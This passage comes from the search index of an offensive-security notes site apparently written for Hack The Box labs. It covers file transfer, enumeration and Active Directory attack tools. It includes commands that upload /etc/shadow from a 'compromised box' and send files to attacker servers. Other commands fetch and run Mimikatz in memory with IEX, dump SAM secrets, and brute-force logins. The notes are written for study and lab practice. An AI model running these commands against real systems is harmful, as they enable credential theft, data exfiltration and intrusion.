.\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_uploads/","title":"Linux file uploads","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_uploads/#startin-uplaod-server","title":"startin uplaod server","text":"<pre><code>## downlaoding\nsudo python3 -m pip install --user uploadserverv\n## creating cert\nopenssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n## starting service\nsudo python3 -m uploadserver 443 --server-certificate ~/server.pem\n## uplaoding file from compromsied box\ncurl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_uploads/#starign-web-servers","title":"starign web servers","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_uploads/#python3","title":"python3","text":"<pre><code>python3 -m http.server\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_uploads/#python27","title":"python2.7","text":"<pre><code>python2.7 -m SimpleHTTPServer\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_uploads/#php","title":"php","text":"<pre><code>php -S 0.0.0.0:8000\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_uploads/#ruby","title":"ruby","text":"<pre><code>ruby -run -ehttpd . -p8000\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/password_generation/","title":"Password generation","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/password_generation/#generation-password","title":"Generation password","text":"<p>Crunch - crunch (min length of pw) (max length of passwd) (what characters) -o (output) (name of file) <pre><code>crunch 3 3 0123456789ABCDEF -o 3digits.txt\n</code></pre></p> <p>most common is O365 o  - current season  - year   - special characters Password strategy  - season year  - month year  - season year specical character  - company street  - company name</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/researching%20vulns/","title":"Researching vulns","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/researching%20vulns/#resources","title":"Resources","text":"<ul> <li>https://www.exploit-db.com/</li> <li>github </li> <li>Rapid7</li> <li>Google</li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/researching%20vulns/#kali-cli","title":"Kali CLI","text":"<pre><code>searchsploit $vuln\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows/","title":"Windows","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/windows/#rdp","title":"RDP","text":"<pre><code>nmap -sV -sC $target -p3389 --script rdp*\n\n## used to track individual packages and inspect contents - used to bypass EDRS and SIEM tooling\nnmap -sV -sC $target -p3389 --packet-trace --disable-arp-ping -n\n\n\nsudo cpan\n\ngit clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check\n\nfoxxyy26@htb[/htb]$ ./rdp-sec-check.pl $target\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows/#winrm","title":"Winrm","text":"<pre><code>nmap -sV -sC $target -p5985,5986 --disable-arp-ping -n\n\nevil-winrm -i $target -u Cry0l1t3 -p P455w0rD\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows/#wmi","title":"WMI","text":"<pre><code>/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@10.129.201.248 \"hostname\"\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_downloads/","title":"Windows file downloads","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_downloads/#file-downloads","title":"File Downloads","text":"<ul> <li>these are techniques for file downloads on windows systems</li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_downloads/#to-base64","title":"to base64","text":"<pre><code>## encoding filee\ncat id_rsa |base64 -w 0;echo\n\n## decoding file\n[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\"))\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_downloads/#powershell-downlaods","title":"powershell downlaods:","text":"<pre><code># Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\n(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\n# Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\n(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_downloads/#powershell-fileless","title":"powershell fileless","text":"<pre><code>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n\n(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_downloads/#webrequest","title":"WebRequest","text":"<pre><code>PS C:\\htb&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_downloads/#smb-downloads","title":"smb downloads","text":"<pre><code>sudo impacket-smbserver share -smb2support /tmp/smbshare\n\nsudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_downloads/#ftp-downloads","title":"ftp downloads","text":"<pre><code>sudo python3 -m pyftpdlib --port 21\n\n## powershell tranfer\n(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_uploads/","title":"Windows file uploads","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_uploads/#file-uploads","title":"File uploads","text":"<ul> <li>These are ways to upload files to a windows host</li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_uploads/#powershell-base64-encode-decode","title":"PowerShell Base64 Encode &amp; Decode","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_uploads/#encoding-file-with","title":"encoding file with","text":"<pre><code>[Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\nGet-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_uploads/#decoding-in-bash","title":"decoding in bash","text":"<pre><code>echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_uploads/#powershell-upload-to-python-server","title":"powershell upload to python server","text":"<pre><code>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nInvoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_uploads/#base64-web-upload","title":"base64 web upload","text":"<pre><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nInvoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_uploads/#smb-uploads-over-configuring-webdav-server","title":"smb uploads over Configuring WebDav Server","text":"<pre><code>## installing needed packages\nsudo pip3 install wsgidav cheroot\n\nsudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n\n## uploading files\ncopy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\ncopy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/windows_file_uploads/#ftp-uploads","title":"FTP uploads","text":"<pre><code>### installing needed packages\nsudo python3 -m pyftpdlib --port 21 --write\n\n#powershell upload\n(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/blue_team/","title":"Blue team","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/blue_team/#blue-team-powershell-cmmds","title":"Blue team Powershell cmmds","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/blue_team/#find-as-rep-roastable-accounts-no-pre-auth","title":"find AS-REP Roastable Accounts (No Pre-Auth)","text":"<pre><code>Get-ADUser -Filter 'DoesNotRequirePreAuth -eq True' -Properties DoesNotRequirePreAuth\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/red_team/","title":"Affected Powershell oneliners for Red and Blue Team","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/red_team/#get-local-users","title":"Get local users","text":"<pre><code>Get-LocalUser\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/red_team/#get-active-smb-sessions","title":"get active SMB sessions","text":"<pre><code>Get-NetSession\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/red_team/#active-user-logins","title":"active user logins","text":"<pre><code>Get-NetLoggedon\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/red_team/#get-domain-info","title":"Get domain info","text":"<pre><code>Get-ADDomain\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/red_team/#get-trust-relationshiop","title":"get trust relationshiop","text":"<pre><code>Get-ADTrust -Filter *\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Powershell/red_team/#finds-computers-with-unconstrained-delegation","title":"finds computers with unconstrained delegation","text":"<pre><code>Get-NetComputer -Unconstrained \n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Evil-WinRM/","title":"Evil WinRM","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Evil-WinRM/#usage","title":"Usage","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Evil-WinRM/#help","title":"help","text":"<ul> <li>-i<ul> <li>machine ip</li> </ul> </li> <li>-u <ul> <li>username</li> </ul> </li> <li>p<ul> <li>password</li> </ul> </li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Evil-WinRM/#examples","title":"Examples","text":"<pre><code>- `evil-winrm -i $target -u &lt;username&gt; -p &lt;pass&gt; `\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Evil-WinRM/#post-intial-access-help","title":"POST intial access help","text":"<p>upload     upload a file from your device onto the machine </p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Fuff/","title":"Fuff","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Fuff/#usagelink","title":"usage/link","text":"<p>we can use this for many different things https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Fuff/#bruteforcing","title":"BruteForcing","text":"<p>we can take a get request from Burp and copy and paste it into a txt file from there change the password to \"FUZZ\"     Fuzz is the variable fuzz will use to determine where the password is</p> <p>then we need to add a few things in the command     -request          the file we want to use      -request-proto http          protocol (in this, and most cases http)     -w (wordlists)         what word lists would you like to try against     -mode          clusterbomb         sniper  final command <pre><code>fuff -request req.txt -request-proto http -w /usr/share/seclists/SecLists-Master/Passwords/xato-net-10-million-passwords-1000.txt\n</code></pre> look for a chance in length or status <p>to grep results     -fs  <p>you can set multiple variables  FUZZUSER FUZZPASS</p> <p>multiple variables clusterbomb example <pre><code>ffuf -request req.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w /usr/share/seclists/Usernames/top-username-shortlist.txt:FUZZUSER\n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/GoBuster/","title":"GoBuster","text":"<p>Topics: #enumeration #directoryBusting #enumeration #infogathering</p> <p>Notes: Installing go lang      sudo apt install golang-go installing gobuster <pre><code>go install github.com/OJ/gobuster/v3@latest\n\nsudo git clone https://github.com/OJ/gobuster.git\ncd gobuster\ngo get &amp;&amp; go build\ngo install\n</code></pre> example command <pre><code>sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u $target \n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Hashcat/","title":"Hashcat","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Hashcat/#usage","title":"Usage","text":"<ul> <li>hashcat is used to crack hashes. it has multiple modes to attempt to crack hundreds of hash algorithms Hashcat Modes</li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Hashcat/#help","title":"help","text":"<p>-m modes</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Hashcat/#useful-modules","title":"Useful modules","text":"<ul> <li>NTLM<ul> <li>5600</li> </ul> </li> <li>Kerberos     -13100</li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Hashcat/#examples","title":"Examples","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Hashcat/#helpful-websites","title":"Helpful websites","text":"<p>-Hashcat modules tables Modules Tables</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Hydra/","title":"Hydra","text":"<p>Topics: #bruteforce</p> <p>Notes: Hydra - bruteforcing tool     -l  (name)     -P (password file)      -f (stops after finding working password)     -v (verbose)   -t (threads or speed)     IP     http-post-form   (http method)     \"/login.php:pin=^PASS^:Access Denied\" (has three parts separated by:)         /login.php (where the pin code is placed)         pin=^PASS^ (where the password will go)         Access denied (indicates that invalid passwords page will lead too)     -S (port number)</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Impacket/","title":"Impacket","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Impacket/#getnpuserspy","title":"GetNPUsers.py","text":"<ul> <li>impacket GetNPUsers is a command-line tool within the Impacket suite, used for extracting Kerberos Pre-Authentication (PreAuth) users from a Windows domain. This tool helps in identifying potential attack vectors and identifying users that can be targeted for pass-the-hash (PtH) or pass-the-ticket (PtT) attacks.</li> <li>usage<ul> <li>-no-pass </li> <li>-dc-ip \"IP address\"</li> </ul> </li> <li>One liner to paste user file <pre><code>for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done\n</code></pre></li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Impacket/#secretdump","title":"Secretdump","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Impacket/#dump-secrets-from-local-files-need-to-dump-sam-and-system-files","title":"dump secrets from local files (need to dump sam and system files)","text":"<p>reg save hklm\\sam sam reg save hklm\\system system <pre><code>impacket-secretsdump -sam &lt;Sam_file&gt; -system &lt;system_file&gt; local\n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Metasploit/","title":"Metasploit","text":"<p>Topics: #exploitation #metasploit #shells</p> <p>Notes: metasploit     search (search for something)     use number (how to use a number or module)     info (what are we about to run)     options (what needs to be set)         RHOST (who are we atttackin)         LHOST (local host)     set (set whatever variable)     run (runs the module)     Show Target (There may be multiple targets to choose from)     exploit (runs the module The cool way)     Payload options (may need to change them if things fail)     sessions (shows all of your current sessions)     sessions -i  (interact with seassion number) <p>How to upgrade shell to meterpreter     use /multi/manage/shell_to_meterpreter</p> <p>How to catch a shell     use multi/handler</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Metasploit/#meterpreter-session","title":"Meterpreter session","text":"<ul> <li>\"shell\"<ul> <li>used to get cmd shell on the device</li> </ul> </li> <li>\"load powershell\"<ul> <li>loads powershell.exe for you to move from shell to shell</li> </ul> </li> <li>How to run local_exploit suggester<ul> <li>run post/multi/recon/local_exploit_suggester</li> </ul> </li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Nessus/","title":"Nessus","text":"<p>Topics: #vulnscan #nessus</p> <p>Notes: sudo dpkg -i Nessus-10.6.4-debian10_amd64.deb </p> <p>/bin/systemctl start nessusd.service     Starts nessus service  https:\\(Hostname):8834</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Nmap/","title":"nmap (network mapper)","text":"<pre><code>-T4 (speed of packets)\n-p- (All ports) no P = top 1000 ports (take away -  and add a number for the specific port)\n-A (all of it, everything)\n-sn (ping scans)\n-Pn (treat all hosts as oline)\n-sU (UDP scan )\n-SV (probe open ports to determine service/version)\n-sC \n-O\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Nmap/#notes","title":"Notes:","text":"<p>-A      Aggressive - scans everything -Pn      treat host as online (used if machine does not respond to Ping) -sU     UDP port scan -p-     all ports65565 -p     (-p80,443,22) scan only those ports -O      (OS detection) -script      Run specified Nmap scripts"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Nmap/#other","title":"Other","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Nmap/#scripts","title":"Scripts","text":"<p>Nmap scrips can be found in the following directly on Kali <pre><code>/usr/share/nmap/scripts\n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/Nmap/#example","title":"example","text":"<p><pre><code>nmap -p- -A -Pn _IP_ -o output.txt\n</code></pre> This command runs for all ports, aggressave/all, treat the host as online and put the results into a txt file</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/SQLMAP/","title":"SQLMAP","text":"<p>Date: 2024-05-19</p> <p>Topics: #sqlinjection #exploitation #SQLMAP</p> <p>Notes:</p> <p>-r       requests --level=2     next level --dump     dump the database -u      full URL you would like to test --cookie=     cookie value         this may be needed in order to have the correct permissions to test the webpage properly --os-shell     can assist you in getting a low level shell     may need to stabilize it"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/bloodhound/","title":"Bloodhound","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/bloodhound/#download","title":"Download","text":"<p><code>git clone https://github.com/BloodHoundAD/BloodHound.git</code></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/bloodhound/#transfer-file-to-infected-device","title":"Transfer file to infected device","text":"<p><code>SharpHound.ps1</code></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/bloodhound/#run-it-on","title":"Run it on","text":"<p><code>invoke-bloodhound -collectionmethod all -domain Domain -ldapuser username -ldappass password</code> get Sharphound.exe on windows system run the command <code>/SharpHound.exe --CollectionMethods all -d htb.local --ldapusername svc-alfresco --ldappassword</code></p> <pre><code>sudo bloodhound-python -d &lt;domain&gt; -u &lt;usernaem&gt; -p &lt;password -ns $target -c All\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/crackmapexec/","title":"Crackmapexec","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/crackmapexec/#usage","title":"Usage","text":"<p>Tool with many advanced usages including enumeration, testing credentials, etc</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/crackmapexec/#notes","title":"notes","text":"<ul> <li>smb<ul> <li>smb enumeration<ul> <li>--shares<ul> <li>enumerate all shares form a specific user</li> </ul> </li> </ul> </li> </ul> </li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/ldapsearch/","title":"Ldapsearch tool","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/ldapsearch/#usage","title":"usage","text":"<p>Tool is used for querying data from LDAP databases. Can be used for enumeration on a target after getting intial access - -x     - simple auth - -w     - password - -D     - username - -H     - URI Identifier (machine your attacking)     - 'ldap://' - -b     - base dn ('dc=,dc) - -s sub     - scope   one of base, one, sub or children (search scope)"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/ldapsearch/#examples","title":"Examples","text":"<pre><code>ldapsearch -x -H 'ldap://10.10.10.100' -D 'svc_tgs' -w 'GPPstillStandingStrong2k18' -b 'dc=active,dc=htb' \n</code></pre> <p><pre><code>ldapsearch -x -H 'ldap://10.10.10.100' -D 'svc_tgs' -w 'GPPstillStandingStrong2k18' -b 'dc=active,dc=htb' -s sub \"(&amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))\"1\n</code></pre> <pre><code>ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b \"dc=active,dc=htb\" -s sub \"(&amp;(objectCategory=person)(objectClass=user)(!\n(useraccountcontrol=514)))\" serviceprinciplename \n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/ldapsearch/#chatsheet","title":"Chatsheet","text":"<p>https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/netexec/","title":"Netexec","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/netexec/#dump-all-files-from-the-available-shares","title":"Dump all files from the available shares","text":"<p>Files saved to the following directory in Kali linux /tmp/nxc_hosted/nxc_spider_plus] <pre><code>nxc smb $target -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True\n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/netexec/#brute-force","title":"brute force","text":"<pre><code>netexec ldap  $target -u users.txt   -p '$pass'\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/netexec/#test-creds-for-shell-access-via-winrm","title":"Test creds for shell access via winrm","text":"<pre><code>netexec winrm  $target -u '$username' -p '$password'\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Tools/responder/","title":"Responder","text":"<ul> <li> <p>tools used for AD environemtns to capture hashes and other traffic. Mostly used for AD enviornments to caputre NTLMv2 or other hashes</p> </li> <li> <p>-I</p> <ul> <li>Interface on your local machine you want to point the tool towards</li> </ul> </li> <li></li> </ul>"},{"location":"offensive-security/2.%20Pre-Exploitation/Windows%20CMD/cmd_help/","title":"Cmd help","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Windows%20CMD/cmd_help/#blue-and-read-team-help","title":"Blue and read team help","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Windows%20CMD/cmd_help/#query-user-sessions","title":"query user sessions","text":"<p><pre><code>qwinsta /server:&lt;hostname&gt;\n\nquery user /server:&lt;hostname&gt;\n</code></pre> <pre><code>net session\n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Windows%20CMD/cmd_help/#wmic-getting-user-sids","title":"wmic getting user sid's","text":"<pre><code>wmic useraccount get name,sid\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Windows%20CMD/transferring%20files/","title":"Transferring files","text":"<ol> <li> <p>start a smb server on your kali machine with the following command <pre><code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .\n</code></pre> then get your file: <pre><code>copy \\\\&lt;ip of your machine&gt;\\kali\\&lt;File to grab&gt;\n</code></pre></p> </li> <li> <p>certutil</p> </li> <li>urlcache </li> <li>f  example: <pre><code>certutil.exe  -urlcache -f http://172.30.212.232/winPEASx64.exe winpeas.exe\n</code></pre></li> </ol>"},{"location":"offensive-security/3.%20Exploitation/O365/","title":"O365","text":"<p>Trevorspray</p> <p>we want to validate accounts and passwords get in  - Add a delay to ensure we do not lock out accounts   - Ask before test about the password policy to ensure you do not lock out accounts</p>"},{"location":"offensive-security/3.%20Exploitation/bufferoverflow/","title":"Bufferoverflow","text":"<p>How to run POC buffer overflows</p> <p>many POC docs will provide Msfvenom command for you.</p> <p>reveiw command and see what it is doing - some may create a file or exe on the machine  - while we may want to get a shell - may have to change commment but keep all special characters</p> <p>Once you run the msfvenom payload</p> <p>Grab the charters that is creates</p> <p>replace the POC overflow code</p>"},{"location":"offensive-security/3.%20Exploitation/AD/Getting%20shells/","title":"intialAccess","text":"<p>msfconsole     need to set the following parameters to work          rhosts         smbdomain         smbuser         smbpass         **also changed the payload to x64 system             ex - windows/x64/meterpreter/reverse_tcp         can use the hash         use the hash we got in the SMBrelay attack              used the entire hash  psexec.py (domain/user):''@     can also add without password and it will prompt to type     can also use a hash         e x psexec.py admin@192.168.88.101 -hashes  wmiexec.py     if psexec.py doesnt work smbexec.py     if psexec.py doesnt work"},{"location":"offensive-security/3.%20Exploitation/AD/IPv6%20attacks/","title":"IPv6 attacks","text":"<p>ipv6 is likely acticve in your envirment but no one is actually using IPv6     impersonate the ipv6 DNS server This allows you to take hashes and relay them to the domain controller j     NTLM hashes'</p> 